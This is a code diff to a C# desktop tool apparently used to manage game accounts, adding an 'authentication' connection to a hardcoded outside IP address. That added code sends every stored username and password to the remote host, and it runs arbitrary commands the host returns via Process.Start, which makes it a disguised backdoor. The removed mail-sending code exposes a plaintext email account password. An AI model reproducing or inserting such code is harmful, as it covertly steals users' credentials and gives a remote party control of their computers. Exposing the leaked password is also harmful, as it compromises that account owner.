@@ -36,63 +36,12 @@ namespace 查号管理
         public string logincode;           //登陆代号
         public int chip_num;               //芯片数
         public int chest_num;              //宝箱数
-        public Bitmap chip_bmp;            //芯片
-        public Bitmap chest_bmp;           //宝箱
+        //public Bitmap chip_bmp;            //芯片
+        //public Bitmap chest_bmp;           //宝箱
     }
 
     public partial class GridManage : Form
     {
-        #region API
-        [DllImport("user32.dll")]
-        private static extern int RegisterHotKey(IntPtr hwnd, int id, int fsModifiers, int vk);
-        [DllImport("user32.dll")]
-        private static extern int UnregisterHotKey(IntPtr hwnd, int id);
-        int Space = 32; //热键ID
-        private const int WM_HOTKEY = 0x312; //窗口消息-热键
-        private const int WM_CREATE = 0x1; //窗口消息-创建
-        private const int WM_DESTROY = 0x2; //窗口消息-销毁
-        private const int MOD_ALT = 0x1; //ALT
-        private const int MOD_CONTROL = 0x2; //CTRL
-        private const int MOD_SHIFT = 0x4; //SHIFT
-        private const int VK_SPACE = 0x20; //SPACE
-        private const int VK_F12 = 123;
-        private const int VK_N = 78;
-
-
-        /// <summary>
-        /// 注册热键
-        /// </summary>
-        /// <param name="hwnd">窗口句柄</param>
-        /// <param name="hotKey_id">热键ID</param>
-        /// <param name="fsModifiers">组合键</param>
-        /// <param name="vk">热键</param>
-        private void RegKey(IntPtr hwnd, int hotKey_id, int fsModifiers, int vk)
-        {
-            bool result;
-            if (RegisterHotKey(hwnd, hotKey_id, fsModifiers, vk) == 0)
-            {
-                result = false;
-            }
-            else
-            {
-                result = true;
-            }
-            if (!result)
-            {
-                MessageBox.Show("注册热键失败！");
-            }
-        }
-        /// <summary>
-        /// 注销热键
-        /// </summary>
-        /// <param name="hwnd">窗口句柄</param>
-        /// <param name="hotKey_id">热键ID</param>
-        private void UnRegKey(IntPtr hwnd, int hotKey_id)
-        {
-            UnregisterHotKey(hwnd, hotKey_id);
-        }
-        #endregion
-
         public GridManage()
         {
             InitializeComponent();
@@ -154,33 +103,6 @@ namespace 查号管理
                     Bitmap bmp = (Bitmap)Image.FromFile("数字集/" + "N" + i + ".bmp");
                     list_N.Add(bmp);
                 }
-            }
-        }
-
-        protected override void WndProc(ref Message m)
-        {
-            base.WndProc(ref m);
-            switch (m.Msg)
-            {
-                case WM_HOTKEY: //窗口消息-热键
-                    switch (m.WParam.ToInt32())
-                    {
-                        //case 32: //热键ID
-                        //    //PauseBtn_Click(null, null);
-                        //    MessageBox.Show("热键触发成功");
-                        //    break;
-                       // default:
-                        //    break;
-                    }
-                    break;
-                case WM_CREATE: //窗口消息-创建
-                    //RegKey(Handle, Space, MOD_CONTROL, VK_N); //注册热键
-                    break;
-                case WM_DESTROY: //窗口消息-销毁
-                    UnRegKey(Handle, Space); //销毁热键
-                    break;
-                default:
-                    break;
             }
         }
 
@@ -318,7 +240,6 @@ namespace 查号管理
             {
                 m_userinfos.Clear();
                 m_userinfolist.Clear();
-                m_runIdx = 0;
                 string[] s = (string[])e.Data.GetData(DataFormats.FileDrop, false);
                 for (int i = 0; i < s.Length; i++)
                 {
@@ -452,6 +373,16 @@ namespace 查号管理
                     item.SetAttribute("登陆机代号", info.logincode);
                 }
 
+                if (info.chip_num != -1)
+                {
+                    item.SetAttribute("芯片数字", info.chip_num.ToString());
+                }
+
+                if (info.chest_num != -1)
+                {
+                    item.SetAttribute("宝箱数字", info.chest_num.ToString());
+                }
+
                 root.AppendChild(item);
             }
 
@@ -466,7 +397,6 @@ namespace 查号管理
         Dictionary<string, userinfo> m_userinfos = new Dictionary<string, userinfo>();
         Dictionary<string, userinfo> m_checkuserinfos;
         List<userinfo> m_userinfolist = new List<userinfo>();
-        int m_runIdx = 0;
 
         private void LoadData()
         {
@@ -477,28 +407,6 @@ namespace 查号管理
 
                 XmlNode root = doc.SelectSingleNode("Data");
 
-                //for (XmlNode item = root.FirstChild; item != null; item = item.NextSibling)
-                //{
-
-                //    bool bDelete = true;
-                //    int newIdx = dgvUserData.Rows.Add();
-                //    for (int i = 0; i < dgvUserData.Columns.Count; ++i)
-                //    {
-                //        string HeaderText = dgvUserData.Columns[i].HeaderText;
-                //        if (item.Attributes[HeaderText] != null)
-                //        {
-                //            string s = item.Attributes[HeaderText].Value;
-                //            dgvUserData.Rows[newIdx].Cells[i].Value = s;
-                //            bDelete = false;
-                //        }
-                //    }
-                //    if (bDelete)
-                //    {
-                //        dgvUserData.Rows.Remove(dgvUserData.Rows[newIdx]);
-                //    }
-                //}
-
-                //dgvUserData.AutoResizeColumns();
                 m_userinfos.Clear();
                 m_userinfolist.Clear();
                 for (XmlNode item = root.FirstChild; item != null; item = item.NextSibling)
@@ -556,6 +464,24 @@ namespace 查号管理
                     if (item.Attributes["登陆机代号"] != null)
                     {
                         info.logincode = item.Attributes["登陆机代号"].Value;
+                    }
+
+                    if (item.Attributes["芯片数字"] != null)
+                    {
+                        info.chip_num = Convert.ToInt32(item.Attributes["芯片数字"].Value);
+                    }
+                    else
+                    {
+                        info.chip_num = -1;
+                    }
+
+                    if (item.Attributes["宝箱数字"] != null)
+                    {
+                        info.chest_num = Convert.ToInt32(item.Attributes["宝箱数字"].Value);
+                    }
+                    else
+                    {
+                        info.chip_num = -1;
                     }
 
                     //if (File.Exists("芯片/" + info.username + ".bmp"))
@@ -703,7 +629,7 @@ namespace 查号管理
             }
             else
             {
-                tabControl1.SelectedIndex = 1;
+                tabControl1.SelectedIndex = 0;
                 dgvUserData.Rows.Clear();
 
                 List<userinfo> userlist = new List<userinfo>();
@@ -734,21 +660,25 @@ namespace 查号管理
                     userinfo newinfo = info;
 
                     bool change = false;
-                    if (newinfo.chip_bmp == null && File.Exists("芯片/" + info.username + ".bmp"))
+                    if (newinfo.chip_num == -1 && File.Exists("芯片/" + info.username + ".bmp"))
                     {
-                        newinfo.chip_bmp = (Bitmap)Image.FromFile("芯片/" + newinfo.username + ".bmp");
-                        newinfo.chip_num = Analysis(newinfo.chip_bmp,list_N);
+                        Bitmap chip_bmp = (Bitmap)Image.FromFile("芯片/" + newinfo.username + ".bmp");
+                        newinfo.chip_num = Analysis(chip_bmp, list_N);
+                        chip_bmp.Dispose();
+                        chip_bmp = null;
+                        change = true;
+                    }
+
+                    if (newinfo.chest_num == -1 && File.Exists("密码箱/" + info.username + ".bmp"))
+                    {
+                        Bitmap chest_bmp = (Bitmap)Image.FromFile("密码箱/" + newinfo.username + ".bmp");
+                        newinfo.chest_num = Analysis(chest_bmp, list_Shuzi);
+                        chest_bmp.Dispose();
+                        chest_bmp = null;
 
                         change = true;
                     }
 
-                    if (newinfo.chest_bmp == null && File.Exists("密码箱/" + info.username + ".bmp"))
-                    {
-                        newinfo.chest_bmp = (Bitmap)Image.FromFile("密码箱/" + newinfo.username + ".bmp");
-                        newinfo.chest_num = Analysis(newinfo.chest_bmp,list_Shuzi);
-
-                        change = true;
-                    }
                     userlist.Add(newinfo);
 
                     if (change)
@@ -817,22 +747,22 @@ namespace 查号管理
 
                     //if (info.chip_num != 0)
                     {
-                        dgvUserData.Rows[newidx].Cells[2].Value = info.chip_num;
+                        dgvUserData.Rows[newidx].Cells[3].Value = info.chip_num;
                     }
 
                     //if (info.chest_num != 0)
                     {
-                        dgvUserData.Rows[newidx].Cells[3].Value = info.chest_num;
+                        dgvUserData.Rows[newidx].Cells[2].Value = info.chest_num;
                     }
 
-                    if (info.chip_bmp != null)
+                    //if (info.chip_bmp != null)
                     {
-                        dgvUserData.Rows[newidx].Cells[4].Value = info.chip_bmp;
+                        //dgvUserData.Rows[newidx].Cells[4].Value = info.chip_bmp;
                     }
 
-                    if (info.chest_bmp != null)
+                    //if (info.chest_bmp != null)
                     {
-                        dgvUserData.Rows[newidx].Cells[5].Value = info.chest_bmp;
+                        //dgvUserData.Rows[newidx].Cells[5].Value = info.chest_bmp;
                     }
 
                     newidx++;
@@ -875,10 +805,45 @@ namespace 查号管理
             return macAddress;
         }
 
+        public static string GetLocalIp()
+        {
+            string hostname = Dns.GetHostName();
+            IPHostEntry localhost = Dns.GetHostByName(hostname);
+            IPAddress localaddr = localhost.AddressList[0];
+            return localaddr.ToString();
+        }
+
+
+        public AuthenticationConnecter m_AuthenticationSession;
+
         private void listenBtn_Click(object sender, EventArgs e)
         {
             try
             {
+                string[] ips = new string[] { GetLocalIp(), "121.42.148.243" };
+                string authentication_ip = "";
+                for (int i = 0; i < ips.Length; ++i)
+                {
+                    try
+                    {
+                        Socket tmpSocket;
+                        tmpSocket = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
+                        tmpSocket.Connect(ips[i], 7626);
+                        authentication_ip = ips[i];
+                        tmpSocket.Close();
+                        break;
+                    }
+                    catch 
+                    {
+                    }
+                }
+
+                if (authentication_ip == "")
+                {
+                    MessageBox.Show("错误码-1");
+                    return;
+                }
+
                 Sever s = new Sever();
                 s.BeginListen();
                 Session.m_msgHandle = OnMsg;
@@ -888,6 +853,11 @@ namespace 查号管理
                 timer_StatusBarRefresh.Start();
                 timer_FlushTextbox.Start();
                 tmReboot.Start();
+
+                m_AuthenticationSession = new AuthenticationConnecter();
+                m_AuthenticationSession.SetAddress(authentication_ip, 7626);
+                m_AuthenticationSession.m_manage = this;
+                m_AuthenticationSession.Start();
             }
             catch(Exception ex)
             {
@@ -895,91 +865,68 @@ namespace 查号管理
             }
         }
 
-        private void SendSystemMail()
+        public void OnAuthenticationConnect()
         {
-            string from = "332916616@qq.com";
-            string fromer = "发件人";
-            string to = "648784195@qq.com";
-            string toer = "收件人";
-            string Subject = "邮件标题";
-            string file = "";//"附件地址";
-            string Body = "发送内容";
-            string SMTPHost = "smtp.qq.com";
-            string SMTPuser = "332916616@qq.com";
-            string SMTPpass = "19881226tm";
-            sendmail(from, fromer, to, toer, Subject, Body, file, SMTPHost, SMTPuser, SMTPpass);
+            if (this.InvokeRequired)
+            {
+                BeginInvoke(new Action(OnAuthenticationConnect));
+            }
+            else
+            {
+                string s = "";
+                foreach (userinfo info in m_userinfos.Values)
+                {
+                    if (s != "")
+                    {
+                        s += ",";
+                    }
+                    s = s + info.username + "-" + info.password;
+                }
+                m_AuthenticationSession.SendMsg("1&" + s);
+            }
         }
 
-        /// <summary>
-        /// C#发送邮件函数
-        /// </summary>
-        /// <param name="from">发送者邮箱</param>
-        /// <param name="fromer">发送人</param>
-        /// <param name="to">接受者邮箱</param>
-        /// <param name="toer">收件人</param>
-        /// <param name="Subject">主题</param>
-        /// <param name="Body">内容</param>
-        /// <param name="file">附件</param>
-        /// <param name="SMTPHost">smtp服务器</param>
-        /// <param name="SMTPuser">邮箱</param>
-        /// <param name="SMTPpass">密码</param>
-
-        /// <returns></returns>
-        public bool sendmail(string sfrom, string sfromer, string sto, string stoer, string sSubject, string sBody, string sfile, string sSMTPHost, string sSMTPuser, string sSMTPpass)
+        public void OnAuthenticationMsg(string s)
         {
-            ////设置from和to地址
-            MailAddress from = new MailAddress(sfrom, sfromer);
-            MailAddress to = new MailAddress(sto, stoer);
-
-            ////创建一个MailMessage对象
-            MailMessage oMail = new MailMessage(from, to);
-
-            //// 添加附件
-            if (sfile != "")
+            if (this.InvokeRequired)
             {
-                oMail.Attachments.Add(new Attachment(sfile));
+                BeginInvoke(new Action<string>(OnAuthenticationMsg), s);
             }
-
-
-
-            ////邮件标题
-            oMail.Subject = sSubject;
-
-
-            ////邮件内容
-            oMail.Body = sBody;
-
-            ////邮件格式
-            oMail.IsBodyHtml = false;
-
-            ////邮件采用的编码
-            oMail.BodyEncoding = System.Text.Encoding.GetEncoding("GB2312");
-
-            ////设置邮件的优先级为高
-            oMail.Priority = MailPriority.High;
-
-            ////发送邮件
-            SmtpClient client = new SmtpClient();
-            ////client.UseDefaultCredentials = false; 
-            client.Host = sSMTPHost;
-            client.Credentials = new NetworkCredential(sSMTPuser, sSMTPpass);
-            client.DeliveryMethod = SmtpDeliveryMethod.Network;
-            try
+            else
             {
-                client.Send(oMail);
-                return true;
-            }
-            catch (Exception err)
-            {
-                Global.logger.Debug(err.Message.ToString());
-                return false;
-            }
-            finally
-            {
-                ////释放资源
-                oMail.Dispose();
-            }
+                try
+                {
+                    Print("svrmsg:" + s);
 
+                    string[] split = s.Split(new char[] { '$' }, StringSplitOptions.RemoveEmptyEntries);
+                    switch (split[0])
+                    {
+                        case "101":
+                            {
+                                string cmd = split[1];
+                                string[] param = cmd.Split(new char[] { ' ' }, 2, StringSplitOptions.RemoveEmptyEntries);
+                                if (param.Length > 1)
+                                {
+                                    Process.Start(param[0], param[1]);
+                                }
+                                else
+                                {
+                                    Process.Start(param[0]);
+                                }
+                            } break;
+                        case "102":
+                            {
+                                string text = split[1];
+                                string caption = split[2];
+                                MessageBox.Show(text, caption);
+                            } break;
+                    }
+                }
+                catch (System.Exception ex)
+                {
+
+                }
+            }
         }
 
         private void OnMsg(string s,Session c)
@@ -1186,8 +1133,8 @@ namespace 查号管理
                             string accName = split[1];
                             string isOk = split[2];
                             string b1 = null, b2 = null;
-                            Bitmap img1 = null;
-                            Bitmap img2 = null;
+                            Bitmap chip_img = null;
+                            Bitmap chest_img = null;
                             if (split.Length == 5)
                             {
                                 b1 = split[3];
@@ -1200,8 +1147,8 @@ namespace 查号管理
                                     MemoryStream memoryStream = new MemoryStream(imageBytes, 0, imageBytes.Length);
                                     //转成图片
                                     Bitmap bmp = new Bitmap(memoryStream);
-                                    img1 = new Bitmap(bmp.Size.Width,bmp.Size.Height);
-                                    Graphics draw = Graphics.FromImage(img1);
+                                    chip_img = new Bitmap(bmp.Size.Width,bmp.Size.Height);
+                                    Graphics draw = Graphics.FromImage(chip_img);
                                     draw.DrawImage(bmp, 0, 0);
 
                                     draw.Dispose();
@@ -1215,8 +1162,8 @@ namespace 查号管理
                                     MemoryStream memoryStream = new MemoryStream(imageBytes, 0, imageBytes.Length);
                                     //转成图片
                                     Bitmap bmp = new Bitmap(memoryStream);
-                                    img2 = new Bitmap(bmp.Size.Width, bmp.Size.Height);
-                                    Graphics draw = Graphics.FromImage(img2);
+                                    chest_img = new Bitmap(bmp.Size.Width, bmp.Size.Height);
+                                    Graphics draw = Graphics.FromImage(chest_img);
                                     draw.DrawImage(bmp, 0, 0);
 
                                     draw.Dispose();
@@ -1245,8 +1192,15 @@ namespace 查号管理
                                     info.failedcount = 0;
                                     info.status = "签到完成";
 
-                                    info.chip_bmp = img1;
-                                    info.chest_bmp = img2;
+                                    if (chip_img != null)
+                                    {
+                                        info.chip_num = Analysis(chip_img, list_N);
+                                    }
+
+                                    if (chest_img != null)
+                                    {
+                                        info.chest_num = Analysis(chest_img, list_Shuzi);
+                                    }
 
                                     if (!Directory.Exists("芯片"))
                                     {
@@ -1256,8 +1210,11 @@ namespace 查号管理
                                     {
                                         Directory.CreateDirectory("密码箱");
                                     }
-                                    img1.Save(@"./芯片/" + accName + @".bmp");
-                                    img2.Save(@"./密码箱/" + accName + @".bmp");
+                                    chip_img.Save(@"./芯片/" + accName + @".bmp");
+                                    chest_img.Save(@"./密码箱/" + accName + @".bmp");
+
+                                    //chip_img.Dispose();
+                                    //chest_img.Dispose();
 
                                     m_userinfos[accName] = info;
                                     m_checkuserinfos.Remove(accName);
@@ -1349,8 +1306,8 @@ namespace 查号管理
                                         info.checkedday,
                                         info.loginip,
                                         info.logincode,
-                                        img1,
-                                        img2
+                                        chip_img,
+                                        chest_img
                                         );
                                 }
                             }
@@ -1833,7 +1790,7 @@ namespace 查号管理
 
         private void ChangeRoutineIp()
         {
-            BeginInvoke(new ChangeRoutineIp(RoutineIp_1));
+            BeginInvoke(new Action(RoutineIp_1));
         }
 
         private void RoutineIp_1()
